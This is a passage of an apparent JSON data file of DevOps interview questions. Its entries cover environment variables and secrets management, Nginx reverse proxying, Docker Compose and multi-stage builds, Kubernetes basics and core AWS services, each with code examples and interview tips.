+    "id": "devops-env-vars",
+    "sectionId": "git-devops-interview",
+    "orderIndex": 20,
+    "title": "Environment Variables & Dotenv",
+    "difficulty": "Beginner",
+    "type": "Concept",
+    "concepts": ["Environment Variables", "dotenv", "Secrets Management", "12-Factor App", "Configuration"],
+    "content": {
+      "question": "What are environment variables? How do you manage configuration and secrets across different environments?",
+      "answer": "Environment variables are key-value pairs set outside your application code that configure its behavior. They separate configuration from code, following the 12-Factor App principle that config should be stored in the environment.\n\nWhy environment variables?\n- Different values for dev/staging/production (database URLs, API keys)\n- Secrets never appear in source code or version control\n- Same code artifact runs in any environment by changing env vars\n- Easy to change without redeploying code\n\nThe dotenv pattern: a .env file in your project root holds local development values. Libraries like dotenv load these into process.env at startup. The .env file is in .gitignore, and each developer has their own copy. A .env.example file (committed to Git) documents required variables without actual values.\n\nFor production, env vars are set through the hosting platform (Heroku config vars, AWS Parameter Store, Kubernetes secrets, Docker environment) rather than .env files. Secrets management tools like HashiCorp Vault, AWS Secrets Manager, or Doppler provide rotation, access control, and audit logging for sensitive values.",
+      "codeExamples": [
+        {
+          "title": "Dotenv Setup and Usage",
+          "code": "# .env (in .gitignore - NEVER commit this)\nDATABASE_URL=postgresql://user:pass@localhost:5432/mydb\nJWT_SECRET=super-secret-key-change-in-production\nGEMINI_API_KEY=AIza...\nPORT=3000\nNODE_ENV=development\nAWS_BUCKET_NAME=my-uploads-dev\n\n# .env.example (committed to Git - documents required vars)\nDATABASE_URL=postgresql://user:pass@localhost:5432/mydb\nJWT_SECRET=your-secret-here\nGEMINI_API_KEY=your-gemini-key\nPORT=3000\nNODE_ENV=development\nAWS_BUCKET_NAME=your-bucket-name\n\n# Load in Node.js\nimport 'dotenv/config';\n// Or:\nimport dotenv from 'dotenv';\ndotenv.config();\n\n// Access variables\nconst port = process.env.PORT || 3000;\nconst dbUrl = process.env.DATABASE_URL;\nif (!dbUrl) throw new Error('DATABASE_URL is required');\n\n// Validate all required env vars at startup\nconst required = ['DATABASE_URL', 'JWT_SECRET', 'GEMINI_API_KEY'];\nfor (const key of required) {\n  if (!process.env[key]) {\n    throw new Error(`Missing required env var: ${key}`);\n  }\n}",
+          "explanation": "Always validate required env vars at startup. Fail fast with a clear error instead of crashing later with a cryptic message. Use .env.example to document what is needed."
+        },
+        {
+          "title": "Environment-Specific Configuration",
+          "code": "# Multiple .env files for different environments\n# .env                  (default, loaded first)\n# .env.local            (local overrides, gitignored)\n# .env.development      (dev-specific)\n# .env.production       (prod-specific)\n# .env.test             (test-specific)\n\n# Vite loads env vars with VITE_ prefix\n# .env\nVITE_API_URL=http://localhost:3000/api\nVITE_GOOGLE_CLIENT_ID=your-client-id\n\n# Access in React (Vite)\nconst apiUrl = import.meta.env.VITE_API_URL;\n// Only VITE_ prefixed vars are exposed to client\n// This prevents accidentally leaking server secrets\n\n# Shell environment variables\nexport NODE_ENV=production\nexport PORT=8080\nnode dist/index.js\n\n# Inline env vars\nDATABASE_URL=postgres://prod@db:5432/app node dist/index.js\n\n# Docker environment variables\ndocker run -e NODE_ENV=production -e PORT=8080 myapp\n# Or from a file:\ndocker run --env-file .env.production myapp",
+          "explanation": "Client-side frameworks use prefixes (VITE_, NEXT_PUBLIC_) to prevent leaking server secrets. Only prefixed variables are bundled into the client build."
+        },
+        {
+          "title": "Secrets Management in Production",
+          "code": "# GitHub Actions secrets\n# Set in repo Settings > Secrets > Actions\n# .github/workflows/deploy.yml\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"Deploying...\"\n        env:\n          DATABASE_URL: ${{ secrets.DATABASE_URL }}\n          JWT_SECRET: ${{ secrets.JWT_SECRET }}\n\n# AWS Systems Manager Parameter Store\naws ssm put-parameter \\\n  --name \"/myapp/prod/DATABASE_URL\" \\\n  --type SecureString \\\n  --value \"postgresql://prod@rds:5432/myapp\"\n\n# Retrieve at runtime\naws ssm get-parameter \\\n  --name \"/myapp/prod/DATABASE_URL\" \\\n  --with-decryption \\\n  --query 'Parameter.Value' --output text\n\n# Kubernetes secrets\nkubectl create secret generic app-secrets \\\n  --from-literal=JWT_SECRET=super-secret \\\n  --from-literal=DATABASE_URL=postgres://...\n\n# Reference in pod spec:\n# env:\n#   - name: JWT_SECRET\n#     valueFrom:\n#       secretKeyRef:\n#         name: app-secrets\n#         key: JWT_SECRET",
+          "explanation": "Never store production secrets in .env files on servers. Use platform-native secrets: GitHub Secrets for CI/CD, AWS SSM/Secrets Manager for AWS, Kubernetes Secrets for K8s."
+        }
+      ],
+      "notes": [
+        "Never commit .env files to Git - always add them to .gitignore",
+        "Client-side env vars (VITE_, NEXT_PUBLIC_) are embedded in the build and visible to users",
+        "Validate all required env vars at application startup to fail fast"
+      ],
+      "followUps": [
+        "What happens if a secret is accidentally committed to Git?",
+        "How do you rotate secrets without downtime?",
+        "What is the difference between environment variables and config files?"
+      ],
+      "interviewTips": [
+        "Mention the 12-Factor App principle of storing config in the environment",
+        "Know the difference between server-side and client-side env vars",
+        "Discuss secrets management tools for production, not just .env files"
+      ]
+    }
+  },
+  {
+    "id": "devops-nginx",
+    "sectionId": "git-devops-interview",
+    "orderIndex": 21,
+    "title": "Nginx & Reverse Proxy",
+    "difficulty": "Intermediate",
+    "type": "Coding",
+    "concepts": ["Nginx", "Reverse Proxy", "Load Balancing", "SSL/TLS", "Static Files", "Caching"],
+    "content": {
+      "question": "What is Nginx? Explain reverse proxy, load balancing, and how you would configure Nginx for a Node.js application.",
+      "answer": "Nginx is a high-performance web server that excels as a reverse proxy, load balancer, and static file server. It handles thousands of concurrent connections efficiently using an event-driven, non-blocking architecture.\n\nReverse proxy: Nginx sits in front of your application servers and forwards client requests to them. Benefits include SSL termination (handling HTTPS at the proxy level), load balancing across multiple app instances, caching static assets, hiding internal server architecture, and providing rate limiting and security headers.\n\nLoad balancing distributes traffic across multiple application instances. Strategies include round-robin (default, equal distribution), least connections (sends to the server with fewest active connections), IP hash (same client always goes to same server, useful for sessions), and weighted (more traffic to more powerful servers).\n\nTypical setup: Client -> Nginx (port 80/443) -> Node.js (port 3000). Nginx handles SSL, serves static files directly (much faster than Node.js), and proxies API requests to Node.js. This is the standard production architecture for most web applications.",
+      "codeExamples": [
+        {
+          "title": "Basic Nginx Reverse Proxy",
+          "code": "# /etc/nginx/sites-available/myapp\nserver {\n    listen 80;\n    server_name example.com www.example.com;\n\n    # Redirect HTTP to HTTPS\n    return 301 https://$server_name$request_uri;\n}\n\nserver {\n    listen 443 ssl http2;\n    server_name example.com www.example.com;\n\n    # SSL certificates (Let's Encrypt)\n    ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;\n    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;\n\n    # Security headers\n    add_header X-Frame-Options DENY;\n    add_header X-Content-Type-Options nosniff;\n    add_header X-XSS-Protection \"1; mode=block\";\n\n    # Proxy API requests to Node.js\n    location /api/ {\n        proxy_pass http://localhost:3000;\n        proxy_http_version 1.1;\n        proxy_set_header Upgrade $http_upgrade;\n        proxy_set_header Connection 'upgrade';\n        proxy_set_header Host $host;\n        proxy_set_header X-Real-IP $remote_addr;\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n        proxy_set_header X-Forwarded-Proto $scheme;\n    }\n\n    # Serve static React build\n    location / {\n        root /var/www/myapp/dist;\n        try_files $uri $uri/ /index.html;\n    }\n}",
+          "explanation": "This config handles SSL, redirects HTTP to HTTPS, proxies /api/ to Node.js, and serves the React build for all other routes. try_files with /index.html enables client-side routing."
+        },
+        {
+          "title": "Load Balancing with Nginx",
+          "code": "# /etc/nginx/nginx.conf\n\n# Define upstream servers\nupstream node_app {\n    # Load balancing strategies:\n\n    # Round-robin (default) - equal distribution\n    server 127.0.0.1:3001;\n    server 127.0.0.1:3002;\n    server 127.0.0.1:3003;\n\n    # Least connections\n    # least_conn;\n    # server 127.0.0.1:3001;\n    # server 127.0.0.1:3002;\n\n    # IP hash (sticky sessions)\n    # ip_hash;\n    # server 127.0.0.1:3001;\n    # server 127.0.0.1:3002;\n\n    # Weighted (send more traffic to stronger server)\n    # server 127.0.0.1:3001 weight=3;\n    # server 127.0.0.1:3002 weight=1;\n\n    # Health checks\n    server 127.0.0.1:3001 max_fails=3 fail_timeout=30s;\n    server 127.0.0.1:3002 max_fails=3 fail_timeout=30s;\n    server 127.0.0.1:3003 backup;  # only used if others are down\n}\n\nserver {\n    listen 80;\n    location /api/ {\n        proxy_pass http://node_app;\n    }\n}",
+          "explanation": "Upstream blocks define server groups for load balancing. max_fails and fail_timeout provide automatic health checking. backup servers are standby only."
+        },
+        {
+          "title": "Nginx Management Commands",
+          "code": "# Test configuration syntax\nsudo nginx -t\n# nginx: configuration file /etc/nginx/nginx.conf test is successful\n\n# Reload config without downtime\nsudo nginx -s reload\n\n# Start/stop/restart\nsudo systemctl start nginx\nsudo systemctl stop nginx\nsudo systemctl restart nginx\nsudo systemctl status nginx\n\n# Enable symlink for site\nsudo ln -s /etc/nginx/sites-available/myapp /etc/nginx/sites-enabled/\n\n# View access and error logs\ntail -f /var/log/nginx/access.log\ntail -f /var/log/nginx/error.log\n\n# Setup SSL with Let's Encrypt (Certbot)\nsudo apt install certbot python3-certbot-nginx\nsudo certbot --nginx -d example.com -d www.example.com\n# Auto-configures Nginx with SSL\n# Auto-renewal: certbot handles it via cron/systemd\n\n# Rate limiting\nlimit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;\nserver {\n    location /api/ {\n        limit_req zone=api burst=20 nodelay;\n        proxy_pass http://localhost:3000;\n    }\n}",
+          "explanation": "Always run nginx -t before reload to catch syntax errors. Certbot automates SSL certificate management. Rate limiting protects against abuse."
+        }
+      ],
+      "notes": [
+        "Always test config with nginx -t before reloading to avoid downtime",
+        "Nginx serves static files 10-100x faster than Node.js",
+        "Use Let's Encrypt with Certbot for free, auto-renewing SSL certificates"
+      ],
+      "followUps": [
+        "What is the difference between a forward proxy and a reverse proxy?",
+        "How does SSL/TLS termination at the proxy level work?",
+        "When would you use ip_hash load balancing?"
+      ],
+      "interviewTips": [
+        "Draw the architecture: Client -> Nginx (SSL) -> Node.js - shows deployment understanding",
+        "Mention SSL termination and static file serving as key Nginx benefits",
+        "Know the load balancing strategies and when to use each"
+      ]
+    }
+  },
+  {
+    "id": "devops-docker-compose",
+    "sectionId": "git-devops-interview",
+    "orderIndex": 22,
+    "title": "Docker Compose & Networking",
+    "difficulty": "Intermediate",
+    "type": "Coding",
+    "concepts": ["Docker Compose", "Docker Networking", "Service Discovery", "Volumes", "Health Checks"],
+    "content": {
+      "question": "How does Docker Compose orchestrate multi-container applications? Explain Docker networking and service communication.",
+      "answer": "Docker Compose defines and runs multi-container applications using a YAML file. Each service runs in its own container but they share a network, making inter-service communication seamless.\n\nDocker networking: Compose automatically creates a bridge network for each project. Containers on the same network can reach each other using service names as hostnames. For example, a Node.js container connects to PostgreSQL using db:5432 where db is the service name.\n\nNetwork types:\n- Bridge (default): Containers on same host communicate via service names. Isolated from the host network.\n- Host: Container shares the host network stack. No port mapping needed but no network isolation.\n- None: No networking. Complete isolation.\n- Overlay: Multi-host networking for Docker Swarm/Kubernetes.\n\nVolumes persist data beyond container lifecycle. Named volumes are managed by Docker and survive container recreation. Bind mounts map host paths into containers, useful for development hot-reloading.\n\nHealth checks let Compose and orchestrators know if a service is actually ready, not just running. depends_on with health checks ensures proper startup order.",
+      "codeExamples": [
+        {
+          "title": "Full-Stack Docker Compose",
+          "code": "# docker-compose.yml\nservices:\n  app:\n    build:\n      context: ./server\n      dockerfile: Dockerfile\n    ports:\n      - '3000:3000'\n    environment:\n      DATABASE_URL: postgresql://user:pass@db:5432/mydb\n      REDIS_URL: redis://cache:6379\n      NODE_ENV: production\n    depends_on:\n      db:\n        condition: service_healthy\n      cache:\n        condition: service_started\n    networks:\n      - backend\n    restart: unless-stopped\n\n  client:\n    build:\n      context: ./client\n      dockerfile: Dockerfile\n    ports:\n      - '80:80'\n    depends_on:\n      - app\n    networks:\n      - backend\n\n  db:\n    image: postgres:16-alpine\n    environment:\n      POSTGRES_USER: user\n      POSTGRES_PASSWORD: pass\n      POSTGRES_DB: mydb\n    volumes:\n      - pgdata:/var/lib/postgresql/data\n      - ./init.sql:/docker-entrypoint-initdb.d/init.sql\n    healthcheck:\n      test: [\"CMD-SHELL\", \"pg_isready -U user -d mydb\"]\n      interval: 5s\n      timeout: 5s\n      retries: 5\n    networks:\n      - backend\n\n  cache:\n    image: redis:7-alpine\n    volumes:\n      - redisdata:/data\n    networks:\n      - backend\n\nvolumes:\n  pgdata:\n  redisdata:\n\nnetworks:\n  backend:\n    driver: bridge",
+          "explanation": "Services communicate using service names as hostnames (db:5432, cache:6379). Health checks on db ensure the app does not start until PostgreSQL is actually ready to accept connections."
+        },
+        {
+          "title": "Docker Networking Deep Dive",
+          "code": "# List networks\ndocker network ls\n# NETWORK ID   NAME                DRIVER\n# abc123       bridge              bridge\n# def456       myapp_backend       bridge\n\n# Inspect a network\ndocker network inspect myapp_backend\n# Shows all containers on the network with their IPs\n\n# Create a custom network\ndocker network create --driver bridge my-network\n\n# Connect a running container to a network\ndocker network connect my-network container-name\n\n# DNS resolution between containers\n# Inside the app container:\nping db          # resolves to db container's IP\nping cache       # resolves to cache container's IP\n\n# Port mapping:\n# -p host:container\n# -p 3000:3000    maps host 3000 to container 3000\n# -p 8080:3000    maps host 8080 to container 3000\n# -p 127.0.0.1:3000:3000  only accessible from localhost\n\n# Internal-only services (no port mapping)\n# db and cache don't need ports mapped to host\n# They're only accessible from other containers on the network\n\n# Expose ports between containers (no host mapping)\nexpose:\n  - \"5432\"",
+          "explanation": "Docker's built-in DNS resolves service names to container IPs automatically on bridge networks. Only map ports to the host for services that need external access."
+        },
+        {
+          "title": "Development vs Production Compose",
+          "code": "# docker-compose.yml (base)\nservices:\n  app:\n    image: myapp\n    environment:\n      NODE_ENV: production\n\n# docker-compose.override.yml (dev - auto-loaded)\nservices:\n  app:\n    build: .\n    volumes:\n      - ./src:/app/src        # hot reload\n      - /app/node_modules     # don't override node_modules\n    environment:\n      NODE_ENV: development\n    command: npm run dev\n\n# docker-compose.prod.yml (production)\nservices:\n  app:\n    image: registry.example.com/myapp:latest\n    deploy:\n      replicas: 3\n      resources:\n        limits:\n          cpus: '0.5'\n          memory: 512M\n    restart: always\n\n# Run development (uses override automatically)\ndocker compose up\n\n# Run production\ndocker compose -f docker-compose.yml -f docker-compose.prod.yml up -d\n\n# Useful commands\ndocker compose ps                    # list running services\ndocker compose logs -f app           # follow app logs\ndocker compose exec app sh           # shell into app container\ndocker compose down --volumes        # stop and remove volumes\ndocker compose build --no-cache      # rebuild without cache",
+          "explanation": "Use override files for dev/prod differences. The override file auto-loads for development. Production compose adds replicas, resource limits, and uses pre-built images."
+        }
+      ],
+      "notes": [
+        "Containers on the same Docker network communicate using service names as hostnames",
+        "depends_on with health checks ensures services start in the correct order",
+        "docker-compose.override.yml is automatically merged for development"
+      ],
+      "followUps": [
+        "What is the difference between volumes and bind mounts?",
+        "How do you handle database migrations in Docker Compose?",
+        "When would you use Docker Compose vs Kubernetes?"
+      ],
+      "interviewTips": [
+        "Know the difference between bridge and host networking",
+        "Explain health checks and why depends_on alone is not sufficient",
+        "Show you use separate compose files for dev and production environments"
+      ]
+    }
+  },
+  {
+    "id": "devops-docker-multistage",
+    "sectionId": "git-devops-interview",
+    "orderIndex": 23,
+    "title": "Docker Multi-Stage Builds",
+    "difficulty": "Intermediate",
+    "type": "Coding",
+    "concepts": ["Multi-Stage Builds", "Image Optimization", "Layer Caching", "Docker Best Practices", "Security"],
+    "content": {
+      "question": "What are Docker multi-stage builds? How do you optimize Docker images for production?",
+      "answer": "Multi-stage builds use multiple FROM statements in a single Dockerfile. Each FROM starts a new build stage. You can selectively copy artifacts from one stage to another, leaving behind build tools and intermediate files. This dramatically reduces image size.\n\nFor example, a TypeScript app needs the full Node.js environment plus dev dependencies to build, but only needs the runtime and production dependencies to run. A multi-stage build compiles in stage 1 and copies only the compiled output to a minimal stage 2.\n\nImage optimization strategies:\n1. Use small base images (alpine variants are 5-10x smaller)\n2. Minimize layers (combine RUN commands with &&)\n3. Leverage layer caching (copy package.json before source code)\n4. Use .dockerignore to exclude unnecessary files\n5. Do not run as root (USER node)\n6. Use multi-stage builds to exclude build tools\n7. Pin exact versions for reproducibility\n\nSmaller images mean faster pulls, less storage, smaller attack surface, and quicker deployments.",
+      "codeExamples": [
+        {
+          "title": "Multi-Stage Build for TypeScript",
+          "code": "# Stage 1: Install dependencies\nFROM node:20-alpine AS deps\nWORKDIR /app\nCOPY package.json package-lock.json ./\nRUN npm ci --only=production\n# Save production node_modules\nRUN cp -R node_modules /prod_modules\n# Install all dependencies (including dev)\nRUN npm ci\n\n# Stage 2: Build TypeScript\nFROM node:20-alpine AS builder\nWORKDIR /app\nCOPY --from=deps /app/node_modules ./node_modules\nCOPY . .\nRUN npm run build\n# Output: dist/ directory\n\n# Stage 3: Production runtime\nFROM node:20-alpine AS runner\nWORKDIR /app\nENV NODE_ENV=production\n\n# Copy only production dependencies\nCOPY --from=deps /prod_modules ./node_modules\n# Copy only compiled output\nCOPY --from=builder /app/dist ./dist\nCOPY package.json ./\n\n# Security: don't run as root\nRUN addgroup -g 1001 -S appgroup\nRUN adduser -S appuser -u 1001 -G appgroup\nUSER appuser\n\nEXPOSE 3000\nCMD [\"node\", \"dist/index.js\"]\n\n# Result: ~150MB instead of ~900MB",
+          "explanation": "Three stages: deps (install), builder (compile), runner (runtime). The final image only has production node_modules and compiled JS. Build tools and source TypeScript are excluded."
+        },
+        {
+          "title": "Layer Caching Optimization",
+          "code": "# BAD: Busts cache on every source change\nFROM node:20-alpine\nWORKDIR /app\nCOPY . .              # Any file change invalidates this layer\nRUN npm ci            # Reinstalls deps every time!\nRUN npm run build\n\n# GOOD: Leverage layer caching\nFROM node:20-alpine\nWORKDIR /app\n\n# Step 1: Copy only dependency files\nCOPY package.json package-lock.json ./\n# Step 2: Install dependencies (cached if package.json unchanged)\nRUN npm ci\n# Step 3: Copy source code\nCOPY . .\n# Step 4: Build (only runs if source changed)\nRUN npm run build\n\n# Docker caches each layer. If package.json hasn't changed,\n# npm ci is SKIPPED (uses cached layer) = much faster builds\n\n# Combine RUN commands to reduce layers\n# BAD: 3 layers\nRUN apt-get update\nRUN apt-get install -y curl\nRUN rm -rf /var/lib/apt/lists/*\n\n# GOOD: 1 layer\nRUN apt-get update && \\\n    apt-get install -y --no-install-recommends curl && \\\n    rm -rf /var/lib/apt/lists/*",
+          "explanation": "Copy package.json first, then npm ci, then source code. This way, dependency installation is cached unless package.json changes. Combining RUN commands reduces image layers."
+        },
+        {
+          "title": "Docker Security Best Practices",
+          "code": "# 1. Use specific image tags (not :latest)\nFROM node:20.11.1-alpine3.19\n# Reproducible builds, no surprise updates\n\n# 2. Non-root user\nUSER node\n# Or create a custom user:\nRUN addgroup -S app && adduser -S app -G app\nUSER app\n\n# 3. Read-only filesystem where possible\ndocker run --read-only --tmpfs /tmp myapp\n\n# 4. Scan for vulnerabilities\ndocker scout cves myapp:latest\n# Or: trivy image myapp:latest\n# Or: snyk container test myapp:latest\n\n# 5. Use .dockerignore\n# .dockerignore\nnode_modules\n.git\n.env\n*.md\ntests/\ncoverage/\n.github/\n\n# 6. Health check in Dockerfile\nHEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \\\n  CMD wget --no-verbose --tries=1 --spider http://localhost:3000/health || exit 1\n\n# 7. No secrets in build args or layers\n# BAD: secret visible in image history\nRUN echo \"secret\" > /app/.env\n# GOOD: pass secrets at runtime\ndocker run -e JWT_SECRET=secret myapp\n# Or use Docker secrets / BuildKit secrets",
+          "explanation": "Pin image versions for reproducibility. Run as non-root to limit container escape damage. Scan images for vulnerabilities before deployment. Never bake secrets into images."
+        }
+      ],
+      "notes": [
+        "Multi-stage builds can reduce image size by 80% or more by excluding build tools",
+        "Copy package.json before source code to leverage Docker layer caching for dependencies",
+        "Always run containers as non-root users in production for security"
+      ],
+      "followUps": [
+        "How does Docker layer caching work?",
+        "What is the difference between COPY and ADD in a Dockerfile?",
+        "How do you handle secrets during Docker image builds?"
+      ],
+      "interviewTips": [
+        "Explain multi-stage builds with the TypeScript example - it is practical and impressive",
+        "Mention layer caching optimization - it shows you build Docker images efficiently",
+        "Know Docker security best practices: non-root, image scanning, no secrets in layers"
+      ]
+    }
+  },
+  {
+    "id": "devops-kubernetes",
+    "sectionId": "git-devops-interview",
+    "orderIndex": 24,
+    "title": "Kubernetes Basics",
+    "difficulty": "Advanced",
+    "type": "Concept",
+    "concepts": ["Kubernetes", "Pods", "Deployments", "Services", "Ingress", "kubectl", "Scaling"],
+    "content": {
+      "question": "What is Kubernetes? Explain pods, deployments, services, and when you would use Kubernetes over Docker Compose.",
+      "answer": "Kubernetes (K8s) is a container orchestration platform that automates deployment, scaling, and management of containerized applications. While Docker Compose manages containers on a single host, Kubernetes manages them across a cluster of machines.\n\nCore concepts:\n- Pod: The smallest deployable unit. Contains one or more containers that share networking and storage. Usually one container per pod.\n- Deployment: Declares the desired state (which image, how many replicas). Kubernetes ensures reality matches the desired state. Handles rolling updates and rollbacks.\n- Service: Provides a stable network endpoint for a set of pods. Pods are ephemeral (they come and go), but services provide a consistent way to reach them.\n- Ingress: Routes external HTTP/HTTPS traffic to services. Acts like a reverse proxy with routing rules.\n\nWhen to use Kubernetes over Docker Compose:\n- Multiple machines (scaling beyond one server)\n- Auto-scaling based on CPU/memory/custom metrics\n- Self-healing (automatic restart/replacement of failed containers)\n- Rolling updates with zero downtime\n- Service discovery across many microservices\n\nKubernetes is overkill for small projects. Docker Compose is simpler for local development and single-server deployments.",
+      "codeExamples": [
+        {
+          "title": "Kubernetes Deployment and Service",
+          "code": "# deployment.yaml\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: myapp\n  labels:\n    app: myapp\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: myapp\n  template:\n    metadata:\n      labels:\n        app: myapp\n    spec:\n      containers:\n        - name: myapp\n          image: myapp:1.0.0\n          ports:\n            - containerPort: 3000\n          env:\n            - name: NODE_ENV\n              value: production\n            - name: DATABASE_URL\n              valueFrom:\n                secretKeyRef:\n                  name: app-secrets\n                  key: database-url\n          resources:\n            requests:\n              cpu: 100m\n              memory: 128Mi\n            limits:\n              cpu: 500m\n              memory: 512Mi\n          readinessProbe:\n            httpGet:\n              path: /health\n              port: 3000\n            initialDelaySeconds: 5\n            periodSeconds: 10\n          livenessProbe:\n            httpGet:\n              path: /health\n              port: 3000\n            initialDelaySeconds: 15\n            periodSeconds: 20\n\n---\n# service.yaml\napiVersion: v1\nkind: Service\nmetadata:\n  name: myapp-service\nspec:\n  selector:\n    app: myapp\n  ports:\n    - port: 80\n      targetPort: 3000\n  type: ClusterIP",
+          "explanation": "The Deployment maintains 3 replicas with health checks. The Service provides a stable endpoint that load-balances across all healthy pods. Secrets come from Kubernetes Secrets, not env files."
+        },
+        {
+          "title": "Essential kubectl Commands",
+          "code": "# Apply configuration\nkubectl apply -f deployment.yaml\nkubectl apply -f service.yaml\n\n# View resources\nkubectl get pods\n# NAME                     READY   STATUS    RESTARTS   AGE\n# myapp-7d4b8c6f5-abc12   1/1     Running   0          5m\n# myapp-7d4b8c6f5-def34   1/1     Running   0          5m\n# myapp-7d4b8c6f5-ghi56   1/1     Running   0          5m\n\nkubectl get deployments\nkubectl get services\nkubectl get pods -o wide        # with IP and node info\n\n# Describe (detailed info + events)\nkubectl describe pod myapp-7d4b8c6f5-abc12\n\n# View logs\nkubectl logs myapp-7d4b8c6f5-abc12\nkubectl logs -f myapp-7d4b8c6f5-abc12    # follow\nkubectl logs --previous myapp-7d4b8c6f5-abc12  # crashed container\n\n# Shell into a pod\nkubectl exec -it myapp-7d4b8c6f5-abc12 -- sh\n\n# Scale\nkubectl scale deployment myapp --replicas=5\n\n# Rolling update\nkubectl set image deployment/myapp myapp=myapp:2.0.0\nkubectl rollout status deployment/myapp\n\n# Rollback\nkubectl rollout undo deployment/myapp\nkubectl rollout history deployment/myapp",
+          "explanation": "kubectl is the primary K8s CLI. apply creates/updates resources. describe shows events for debugging. Rolling updates and rollbacks are built-in."
+        },
+        {
+          "title": "Ingress and Auto-Scaling",
+          "code": "# ingress.yaml - Route external traffic\napiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: myapp-ingress\n  annotations:\n    nginx.ingress.kubernetes.io/rewrite-target: /\nspec:\n  rules:\n    - host: api.example.com\n      http:\n        paths:\n          - path: /\n            pathType: Prefix\n            backend:\n              service:\n                name: myapp-service\n                port:\n                  number: 80\n  tls:\n    - hosts:\n        - api.example.com\n      secretName: tls-secret\n\n---\n# Horizontal Pod Autoscaler\napiVersion: autoscaling/v2\nkind: HorizontalPodAutoscaler\nmetadata:\n  name: myapp-hpa\nspec:\n  scaleTargetRef:\n    apiVersion: apps/v1\n    kind: Deployment\n    name: myapp\n  minReplicas: 2\n  maxReplicas: 10\n  metrics:\n    - type: Resource\n      resource:\n        name: cpu\n        target:\n          type: Utilization\n          averageUtilization: 70\n\n# Check autoscaler status\n# kubectl get hpa\n# NAME       REFERENCE          TARGETS   MINPODS  MAXPODS  REPLICAS\n# myapp-hpa  Deployment/myapp   45%/70%   2        10       3",
+          "explanation": "Ingress routes external traffic by hostname and path. HPA automatically scales pods based on CPU utilization. When CPU exceeds 70%, new pods are created up to maxReplicas."
+        }
+      ],
+      "notes": [
+        "Pods are ephemeral - never store state in pods, use external databases and volumes",
+        "Liveness probes restart unhealthy containers, readiness probes stop routing traffic to them",
+        "Start with managed Kubernetes (EKS, GKE, AKS) rather than self-hosting"
+      ],
+      "followUps": [
+        "What is the difference between a Deployment and a StatefulSet?",
+        "How does Kubernetes service discovery work?",
+        "When is Kubernetes overkill and what alternatives exist?"
+      ],
+      "interviewTips": [
+        "Know the core concepts (Pod, Deployment, Service, Ingress) even if you have not used K8s in production",
+        "Explain when Kubernetes is appropriate vs simpler alternatives like Docker Compose or PaaS",
+        "Mention health probes and auto-scaling to show you understand production concerns"
+      ]
+    }
+  },
+  {
+    "id": "devops-aws-cloud",
+    "sectionId": "git-devops-interview",
+    "orderIndex": 25,
+    "title": "AWS/Cloud Services Overview",
+    "difficulty": "Intermediate",
+    "type": "Theory",
+    "concepts": ["AWS", "EC2", "S3", "RDS", "CloudFront", "IAM", "Cloud Architecture"],
+    "content": {
+      "question": "What AWS services should a developer know? Explain the core services and how they fit together in a typical web application architecture.",
+      "answer": "AWS (Amazon Web Services) provides over 200 cloud services. For a web developer, the essential ones are:\n\nCompute:\n- EC2: Virtual servers. Choose instance type, OS, and scale up/down.\n- ECS/Fargate: Run Docker containers without managing servers.\n- Lambda: Serverless functions. Pay only when code runs.\n\nStorage:\n- S3: Object storage for files, images, backups. Virtually unlimited.\n- EBS: Block storage (hard drives) attached to EC2 instances.\n\nDatabase:\n- RDS: Managed relational databases (PostgreSQL, MySQL). Handles backups, patching, replication.\n- DynamoDB: NoSQL key-value database. Massively scalable.\n- ElastiCache: Managed Redis or Memcached for caching.\n\nNetworking:\n- VPC: Virtual private network isolating your resources.\n- CloudFront: CDN that caches content at edge locations worldwide.\n- Route 53: DNS service for domain management.\n- ALB: Application Load Balancer distributing traffic.\n\nSecurity:\n- IAM: Identity and Access Management. Users, roles, policies.\n- Secrets Manager: Store and rotate secrets.\n- ACM: Free SSL/TLS certificates.\n\nA typical architecture: Route 53 (DNS) -> CloudFront (CDN) -> ALB (load balancer) -> ECS/EC2 (app servers) -> RDS (database) + ElastiCache (cache) + S3 (file storage).",
+      "codeExamples": [
+        {
+          "title": "AWS CLI Essential Commands",
+          "code": "# Configure AWS CLI\naws configure\n# AWS Access Key ID: AKIA...\n# AWS Secret Access Key: ...\n# Default region: us-east-1\n# Default output: json\n\n# S3 Operations\naws s3 ls                           # list buckets\naws s3 ls s3://my-bucket/           # list objects\naws s3 cp file.txt s3://my-bucket/  # upload file\naws s3 sync ./dist s3://my-bucket/  # sync directory\naws s3 rm s3://my-bucket/file.txt   # delete object\n\n# EC2\naws ec2 describe-instances --query \\\n  'Reservations[].Instances[].{ID:InstanceId,State:State.Name,IP:PublicIpAddress}'\naws ec2 start-instances --instance-ids i-1234567890\naws ec2 stop-instances --instance-ids i-1234567890\n\n# RDS\naws rds describe-db-instances --query \\\n  'DBInstances[].{ID:DBInstanceIdentifier,Status:DBInstanceStatus,Endpoint:Endpoint.Address}'\n\n# Secrets Manager\naws secretsmanager get-secret-value --secret-id myapp/prod/db-url\naws secretsmanager create-secret --name myapp/prod/api-key \\\n  --secret-string \"sk-abc123...\"\n\n# CloudWatch Logs\naws logs tail /aws/ecs/myapp --follow",
+          "explanation": "The AWS CLI is essential for automation and debugging. S3 sync is commonly used for deploying static sites. Secrets Manager replaces .env files in production."
+        },
+        {
+          "title": "S3 Static Website + CloudFront",
